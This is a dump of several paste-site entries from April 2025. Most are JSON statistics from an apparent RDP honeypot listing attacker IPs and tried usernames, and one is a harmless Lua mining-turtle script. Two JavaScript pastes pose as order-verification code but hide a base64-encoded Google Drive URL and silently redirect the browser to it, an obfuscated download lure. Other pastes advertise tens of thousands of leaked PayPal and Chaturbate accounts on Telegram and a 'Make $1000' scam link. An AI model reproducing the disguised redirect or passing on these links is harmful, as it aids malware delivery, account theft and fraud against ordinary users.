id,title,username,language,date,content
YKCSZCGt,2025-04-21_stats.json,rdp_snitch,JSON,Monday 21st of April 2025 07:18:12 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 165,
    ""71.82.170.60"": 42,
    ""103.127.198.210"": 9,
    ""211.185.207.14"": 18,
    ""80.94.95.198"": 51,
    ""198.235.24.162"": 9,
    ""80.94.95.90"": 6,
    ""45.43.59.195"": 12,
    ""194.165.16.167"": 6,
    ""45.227.254.155"": 6,
    ""88.214.50.50"": 9,
    ""221.181.44.30"": 6,
    ""152.230.66.217"": 72,
    ""147.185.132.22"": 9,
    ""62.60.188.24"": 6,
    ""71.6.134.235"": 30,
    ""37.61.243.211"": 3,
    ""118.194.248.142"": 3,
    ""43.134.22.70"": 3,
    ""58.218.199.219"": 15,
    ""5.196.92.198"": 3,
    ""194.195.90.207"": 3,
    ""102.88.21.219"": 3,
    ""103.56.7.89"": 3,
    ""178.20.129.235"": 3,
    ""182.76.43.166"": 12,
    ""172.208.53.3"": 3,
    ""195.123.219.95"": 6,
    ""205.210.31.235"": 9,
    ""152.32.139.190"": 3,
    ""198.235.24.202"": 9,
    ""88.214.25.123"": 6
  },
  ""asn"": {
    ""AS212238"": 165,
    ""AS20115"": 42,
    ""AS135983"": 9,
    ""AS4766"": 18,
    ""AS204428"": 57,
    ""AS396982"": 36,
    ""AS21859"": 12,
    ""AS48721"": 6,
    ""AS267784"": 6,
    ""Unknown"": 9,
    ""AS9808"": 6,
    ""AS14259"": 72,
    ""AS215930"": 6,
    ""AS10439"": 30,
    ""AS30781"": 3,
    ""AS135377"": 6,
    ""AS132203"": 3,
    ""AS4134"": 15,
    ""AS16276"": 3,
    ""AS141995"": 3,
    ""AS29465"": 3,
    ""AS140599"": 3,
    ""AS24810"": 3,
    ""AS9498"": 12,
    ""AS8075"": 3,
    ""AS21100"": 6,
    ""AS35042"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 165,
    ""Charter Communications"": 42,
    ""TSDC"": 9,
    ""Korea Telecom"": 18,
    ""SS-Net"": 57,
    ""Google LLC"": 36,
    ""Zenlayer Inc"": 12,
    ""Flyservers S.A."": 12,
    ""SIA \""Singularity Telecom\"""": 9,
    ""China Mobile communications corporation"": 6,
    ""Gtd Internet S.A."": 72,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 6,
    ""CariNet, Inc."": 30,
    ""DC4Data"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""Shenzhen Tencent Computer Systems Company Limited"": 3,
    ""Chinanet"": 15,
    ""OVH SAS"": 3,
    ""Contabo Asia Private Limited"": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Comfac Corporation"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Bharti Airtel"": 12,
    ""MICROSOFT"": 3,
    ""Green Floid LLC"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 165,
    ""Spectrum"": 42,
    ""So Viet Technology Solution Company Limited"": 9,
    ""Kornet"": 18,
    ""Unmanaged LTD"": 57,
    ""Palo Alto Networks, Inc"": 36,
    ""ZENLA"": 12,
    ""Flyservers S.A"": 6,
    ""Xwin Universal LTD"": 6,
    ""SIA \""Singularity Telecom\"""": 9,
    ""China Mobile"": 6,
    ""Gtd Internet S.A"": 72,
    ""UAB Host Baltic"": 6,
    ""CariNet, Inc."": 30,
    ""DcforData SRL"": 3,
    ""Ucloud Information Technology"": 6,
    ""Tencent Cloud Computing"": 3,
    ""Chinanet JS"": 15,
    ""OVH"": 3,
    ""Contabo GmbH"": 3,
    ""MTN Nigeria"": 3,
    ""Comfac Corporation"": 3,
    ""Teleset LLC"": 3,
    ""Bharti Airtel Ltd"": 12,
    ""Microsoft Azure Cloud (eastus)"": 3,
    ""Green Floid LLC"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6
  },
  ""regionName"": {
    ""North West"": 168,
    ""Wisconsin"": 42,
    ""Ho Chi Minh"": 9,
    ""Sejong-si"": 18,
    ""Budapest"": 57,
    ""California"": 36,
    ""Taipei City"": 12,
    ""Kaunas"": 6,
    ""Vilnius"": 6,
    ""New York"": 9,
    ""Guangdong"": 6,
    ""Santiago Metropolitan"": 72,
    ""Tehran"": 6,
    ""Nevada"": 30,
    ""Auvergne-Rh\u00f4ne-Alpes"": 3,
    ""Seoul"": 6,
    ""Jiangsu"": 15,
    ""Hauts-de-France"": 3,
    ""North East"": 3,
    ""Lagos"": 3,
    ""Metro Manila"": 3,
    ""Tatarstan Republic"": 3,
    ""Haryana"": 12,
    ""Virginia"": 3,
    ""Drenthe"": 6,
    ""Kowloon City"": 6
  },
  ""country"": {
    ""Singapore"": 171,
    ""United States"": 120,
    ""Vietnam"": 9,
    ""South Korea"": 24,
    ""Hungary"": 57,
    ""Taiwan"": 12,
    ""Lithuania"": 12,
    ""China"": 21,
    ""Chile"": 72,
    ""Iran"": 6,
    ""France"": 6,
    ""Nigeria"": 3,
    ""Philippines"": 3,
    ""Russia"": 3,
    ""India"": 12,
    ""The Netherlands"": 6,
    ""Hong Kong"": 6
  },
  ""account"": {
    ""hello"": 315,
    ""142.93.8.59"": 123,
    ""YNkfcAYsR"": 3,
    ""EYrJrY"": 3,
    ""BLZdGj"": 3,
    ""Administr"": 6,
    ""Test"": 18,
    ""Domain"": 9,
    ""nuxkVeudh"": 3,
    ""TJRebX"": 3,
    ""aOvXRd"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""Administrator"": 6,
    ""asauiBsbV"": 3,
    ""JDFfEE"": 3,
    ""YWCsOr"": 3,
    ""zBLxMdHzc"": 3,
    ""oBZAoE"": 3,
    ""sXbDnR"": 3
  },
  ""keyboard"": {
    ""Unknown"": 543
  },
  ""client_build"": {
    ""Unknown"": 543
  },
  ""client_name"": {
    ""Unknown"": 543
  },
  ""ip_type"": {
    ""hosting & proxy"": 171,
    ""Unknown"": 240,
    ""hosting"": 96,
    ""mobile"": 18,
    ""proxy"": 15,
    ""mobile & hosting"": 3
  }
}"
BSvbfDxA,Market.js,zebmekey,JavaScript,Monday 21st of April 2025 07:17:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83313/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xTQU9nkZ,2025-04-21_stats.json,rdp_snitch,JSON,Monday 21st of April 2025 07:16:05 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 110,
    ""71.82.170.60"": 28,
    ""103.127.198.210"": 6,
    ""211.185.207.14"": 12,
    ""80.94.95.198"": 34,
    ""198.235.24.162"": 6,
    ""80.94.95.90"": 4,
    ""45.43.59.195"": 8,
    ""194.165.16.167"": 4,
    ""45.227.254.155"": 4,
    ""88.214.50.50"": 6,
    ""221.181.44.30"": 4,
    ""152.230.66.217"": 48,
    ""147.185.132.22"": 6,
    ""62.60.188.24"": 4,
    ""71.6.134.235"": 20,
    ""37.61.243.211"": 2,
    ""118.194.248.142"": 2,
    ""43.134.22.70"": 2,
    ""58.218.199.219"": 10,
    ""5.196.92.198"": 2,
    ""194.195.90.207"": 2,
    ""102.88.21.219"": 2,
    ""103.56.7.89"": 2,
    ""178.20.129.235"": 2,
    ""182.76.43.166"": 8,
    ""172.208.53.3"": 2,
    ""195.123.219.95"": 4,
    ""205.210.31.235"": 6,
    ""152.32.139.190"": 2,
    ""198.235.24.202"": 6,
    ""88.214.25.123"": 4
  },
  ""asn"": {
    ""AS212238"": 110,
    ""AS20115"": 28,
    ""AS135983"": 6,
    ""AS4766"": 12,
    ""AS204428"": 38,
    ""AS396982"": 24,
    ""AS21859"": 8,
    ""AS48721"": 4,
    ""AS267784"": 4,
    ""Unknown"": 6,
    ""AS9808"": 4,
    ""AS14259"": 48,
    ""AS215930"": 4,
    ""AS10439"": 20,
    ""AS30781"": 2,
    ""AS135377"": 4,
    ""AS132203"": 2,
    ""AS4134"": 10,
    ""AS16276"": 2,
    ""AS141995"": 2,
    ""AS29465"": 2,
    ""AS140599"": 2,
    ""AS24810"": 2,
    ""AS9498"": 8,
    ""AS8075"": 2,
    ""AS21100"": 4,
    ""AS35042"": 4
  },
  ""isp"": {
    ""Datacamp Limited"": 110,
    ""Charter Communications"": 28,
    ""TSDC"": 6,
    ""Korea Telecom"": 12,
    ""SS-Net"": 38,
    ""Google LLC"": 24,
    ""Zenlayer Inc"": 8,
    ""Flyservers S.A."": 8,
    ""SIA \""Singularity Telecom\"""": 6,
    ""China Mobile communications corporation"": 4,
    ""Gtd Internet S.A."": 48,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 4,
    ""CariNet, Inc."": 20,
    ""DC4Data"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Shenzhen Tencent Computer Systems Company Limited"": 2,
    ""Chinanet"": 10,
    ""OVH SAS"": 2,
    ""Contabo Asia Private Limited"": 2,
    ""MTN NIGERIA Communication limited"": 2,
    ""Comfac Corporation"": 2,
    ""Teleset LLC Nchelny Branch"": 2,
    ""Bharti Airtel"": 8,
    ""MICROSOFT"": 2,
    ""Green Floid LLC"": 4,
    ""NOC EMAIL: noc@one-host.net"": 4
  },
  ""org"": {
    ""Datacamp Limited"": 110,
    ""Spectrum"": 28,
    ""So Viet Technology Solution Company Limited"": 6,
    ""Kornet"": 12,
    ""Unmanaged LTD"": 38,
    ""Palo Alto Networks, Inc"": 24,
    ""ZENLA"": 8,
    ""Flyservers S.A"": 4,
    ""Xwin Universal LTD"": 4,
    ""SIA \""Singularity Telecom\"""": 6,
    ""China Mobile"": 4,
    ""Gtd Internet S.A"": 48,
    ""UAB Host Baltic"": 4,
    ""CariNet, Inc."": 20,
    ""DcforData SRL"": 2,
    ""Ucloud Information Technology"": 4,
    ""Tencent Cloud Computing"": 2,
    ""Chinanet JS"": 10,
    ""OVH"": 2,
    ""Contabo GmbH"": 2,
    ""MTN Nigeria"": 2,
    ""Comfac Corporation"": 2,
    ""Teleset LLC"": 2,
    ""Bharti Airtel Ltd"": 8,
    ""Microsoft Azure Cloud (eastus)"": 2,
    ""Green Floid LLC"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4
  },
  ""regionName"": {
    ""North West"": 112,
    ""Wisconsin"": 28,
    ""Ho Chi Minh"": 6,
    ""Sejong-si"": 12,
    ""Budapest"": 38,
    ""California"": 24,
    ""Taipei City"": 8,
    ""Kaunas"": 4,
    ""Vilnius"": 4,
    ""New York"": 6,
    ""Guangdong"": 4,
    ""Santiago Metropolitan"": 48,
    ""Tehran"": 4,
    ""Nevada"": 20,
    ""Auvergne-Rh\u00f4ne-Alpes"": 2,
    ""Seoul"": 4,
    ""Jiangsu"": 10,
    ""Hauts-de-France"": 2,
    ""North East"": 2,
    ""Lagos"": 2,
    ""Metro Manila"": 2,
    ""Tatarstan Republic"": 2,
    ""Haryana"": 8,
    ""Virginia"": 2,
    ""Drenthe"": 4,
    ""Kowloon City"": 4
  },
  ""country"": {
    ""Singapore"": 114,
    ""United States"": 80,
    ""Vietnam"": 6,
    ""South Korea"": 16,
    ""Hungary"": 38,
    ""Taiwan"": 8,
    ""Lithuania"": 8,
    ""China"": 14,
    ""Chile"": 48,
    ""Iran"": 4,
    ""France"": 4,
    ""Nigeria"": 2,
    ""Philippines"": 2,
    ""Russia"": 2,
    ""India"": 8,
    ""The Netherlands"": 4,
    ""Hong Kong"": 4
  },
  ""account"": {
    ""hello"": 210,
    ""142.93.8.59"": 82,
    ""YNkfcAYsR"": 2,
    ""EYrJrY"": 2,
    ""BLZdGj"": 2,
    ""Administr"": 4,
    ""Test"": 12,
    ""Domain"": 6,
    ""nuxkVeudh"": 2,
    ""TJRebX"": 2,
    ""aOvXRd"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""Administrator"": 4,
    ""asauiBsbV"": 2,
    ""JDFfEE"": 2,
    ""YWCsOr"": 2,
    ""zBLxMdHzc"": 2,
    ""oBZAoE"": 2,
    ""sXbDnR"": 2
  },
  ""keyboard"": {
    ""Unknown"": 362
  },
  ""client_build"": {
    ""Unknown"": 362
  },
  ""client_name"": {
    ""Unknown"": 362
  },
  ""ip_type"": {
    ""hosting & proxy"": 114,
    ""Unknown"": 160,
    ""hosting"": 64,
    ""mobile"": 12,
    ""proxy"": 10,
    ""mobile & hosting"": 2
  }
}"
tRJ9B1mt,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 07:15:52 PM CDT,63109 Accounts Posted On https://t.me/l34ksbyemin3m
RADNW7SJ,2025-04-21_stats.json,rdp_snitch,JSON,Monday 21st of April 2025 07:15:08 PM CDT,"{
  ""ip"": {
    ""156.146.57.181"": 55,
    ""71.82.170.60"": 14,
    ""103.127.198.210"": 3,
    ""211.185.207.14"": 6,
    ""80.94.95.198"": 17,
    ""198.235.24.162"": 3,
    ""80.94.95.90"": 2,
    ""45.43.59.195"": 4,
    ""194.165.16.167"": 2,
    ""45.227.254.155"": 2,
    ""88.214.50.50"": 3,
    ""221.181.44.30"": 2,
    ""152.230.66.217"": 24,
    ""147.185.132.22"": 3,
    ""62.60.188.24"": 2,
    ""71.6.134.235"": 10,
    ""37.61.243.211"": 1,
    ""118.194.248.142"": 1,
    ""43.134.22.70"": 1,
    ""58.218.199.219"": 5,
    ""5.196.92.198"": 1,
    ""194.195.90.207"": 1,
    ""102.88.21.219"": 1,
    ""103.56.7.89"": 1,
    ""178.20.129.235"": 1,
    ""182.76.43.166"": 4,
    ""172.208.53.3"": 1,
    ""195.123.219.95"": 2,
    ""205.210.31.235"": 3,
    ""152.32.139.190"": 1,
    ""198.235.24.202"": 3,
    ""88.214.25.123"": 2
  },
  ""asn"": {
    ""AS212238"": 55,
    ""AS20115"": 14,
    ""AS135983"": 3,
    ""AS4766"": 6,
    ""AS204428"": 19,
    ""AS396982"": 12,
    ""AS21859"": 4,
    ""AS48721"": 2,
    ""AS267784"": 2,
    ""Unknown"": 3,
    ""AS9808"": 2,
    ""AS14259"": 24,
    ""AS215930"": 2,
    ""AS10439"": 10,
    ""AS30781"": 1,
    ""AS135377"": 2,
    ""AS132203"": 1,
    ""AS4134"": 5,
    ""AS16276"": 1,
    ""AS141995"": 1,
    ""AS29465"": 1,
    ""AS140599"": 1,
    ""AS24810"": 1,
    ""AS9498"": 4,
    ""AS8075"": 1,
    ""AS21100"": 2,
    ""AS35042"": 2
  },
  ""isp"": {
    ""Datacamp Limited"": 55,
    ""Charter Communications"": 14,
    ""TSDC"": 3,
    ""Korea Telecom"": 6,
    ""SS-Net"": 19,
    ""Google LLC"": 12,
    ""Zenlayer Inc"": 4,
    ""Flyservers S.A."": 4,
    ""SIA \""Singularity Telecom\"""": 3,
    ""China Mobile communications corporation"": 2,
    ""Gtd Internet S.A."": 24,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""CariNet, Inc."": 10,
    ""DC4Data"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1,
    ""Chinanet"": 5,
    ""OVH SAS"": 1,
    ""Contabo Asia Private Limited"": 1,
    ""MTN NIGERIA Communication limited"": 1,
    ""Comfac Corporation"": 1,
    ""Teleset LLC Nchelny Branch"": 1,
    ""Bharti Airtel"": 4,
    ""MICROSOFT"": 1,
    ""Green Floid LLC"": 2,
    ""NOC EMAIL: noc@one-host.net"": 2
  },
  ""org"": {
    ""Datacamp Limited"": 55,
    ""Spectrum"": 14,
    ""So Viet Technology Solution Company Limited"": 3,
    ""Kornet"": 6,
    ""Unmanaged LTD"": 19,
    ""Palo Alto Networks, Inc"": 12,
    ""ZENLA"": 4,
    ""Flyservers S.A"": 2,
    ""Xwin Universal LTD"": 2,
    ""SIA \""Singularity Telecom\"""": 3,
    ""China Mobile"": 2,
    ""Gtd Internet S.A"": 24,
    ""UAB Host Baltic"": 2,
    ""CariNet, Inc."": 10,
    ""DcforData SRL"": 1,
    ""Ucloud Information Technology"": 2,
    ""Tencent Cloud Computing"": 1,
    ""Chinanet JS"": 5,
    ""OVH"": 1,
    ""Contabo GmbH"": 1,
    ""MTN Nigeria"": 1,
    ""Comfac Corporation"": 1,
    ""Teleset LLC"": 1,
    ""Bharti Airtel Ltd"": 4,
    ""Microsoft Azure Cloud (eastus)"": 1,
    ""Green Floid LLC"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 2
  },
  ""regionName"": {
    ""North West"": 56,
    ""Wisconsin"": 14,
    ""Ho Chi Minh"": 3,
    ""Sejong-si"": 6,
    ""Budapest"": 19,
    ""California"": 12,
    ""Taipei City"": 4,
    ""Kaunas"": 2,
    ""Vilnius"": 2,
    ""New York"": 3,
    ""Guangdong"": 2,
    ""Santiago Metropolitan"": 24,
    ""Tehran"": 2,
    ""Nevada"": 10,
    ""Auvergne-Rh\u00f4ne-Alpes"": 1,
    ""Seoul"": 2,
    ""Jiangsu"": 5,
    ""Hauts-de-France"": 1,
    ""North East"": 1,
    ""Lagos"": 1,
    ""Metro Manila"": 1,
    ""Tatarstan Republic"": 1,
    ""Haryana"": 4,
    ""Virginia"": 1,
    ""Drenthe"": 2,
    ""Kowloon City"": 2
  },
  ""country"": {
    ""Singapore"": 57,
    ""United States"": 40,
    ""Vietnam"": 3,
    ""South Korea"": 8,
    ""Hungary"": 19,
    ""Taiwan"": 4,
    ""Lithuania"": 4,
    ""China"": 7,
    ""Chile"": 24,
    ""Iran"": 2,
    ""France"": 2,
    ""Nigeria"": 1,
    ""Philippines"": 1,
    ""Russia"": 1,
    ""India"": 4,
    ""The Netherlands"": 2,
    ""Hong Kong"": 2
  },
  ""account"": {
    ""hello"": 105,
    ""142.93.8.59"": 41,
    ""YNkfcAYsR"": 1,
    ""EYrJrY"": 1,
    ""BLZdGj"": 1,
    ""Administr"": 2,
    ""Test"": 6,
    ""Domain"": 3,
    ""nuxkVeudh"": 1,
    ""TJRebX"": 1,
    ""aOvXRd"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""Administrator"": 2,
    ""asauiBsbV"": 1,
    ""JDFfEE"": 1,
    ""YWCsOr"": 1,
    ""zBLxMdHzc"": 1,
    ""oBZAoE"": 1,
    ""sXbDnR"": 1
  },
  ""keyboard"": {
    ""Unknown"": 181
  },
  ""client_build"": {
    ""Unknown"": 181
  },
  ""client_name"": {
    ""Unknown"": 181
  },
  ""ip_type"": {
    ""hosting & proxy"": 57,
    ""Unknown"": 80,
    ""hosting"": 32,
    ""mobile"": 6,
    ""proxy"": 5,
    ""mobile & hosting"": 1
  }
}"
htbktup6,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 07:00:29 PM CDT,06750 Accounts Posted On https://t.me/l34ksbyemin3m
GCY8eXea,staircase-builder-up.lua,Xmann1,Lua,Monday 21st of April 2025 06:45:40 PM CDT,"while true do
  turtle.dig()

  while turtle.getItemCount() == 0 do
    if turtle.getSelectedSlot() == 16 then
      break
    end

    turtle.select(turtle.getSelectedSlot() + 1)
  end

  if turtle.getSelectedSlot() == 16 then
    break
  end

  turtle.place()

  if not turtle.up() then
    break
  end

  if not turtle.forward() then
    break
  end 
end
"
pq1hY8kT,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Monday 21st of April 2025 06:45:07 PM CDT,57964 Accounts Posted On https://t.me/l34ksbyemin3m
RN15FtA1,Untitled,zebmekey,JavaScript,Monday 21st of April 2025 06:44:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14335/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hNMLt8ZJ,Make $1000 15-MINUTES  (BEGINNER) SW,MKGODLY,JavaScript,Monday 21st of April 2025 06:42:19 PM CDT," 
Pdf https://tinyurl.com/privguidee


ijRKYzpo3m
"
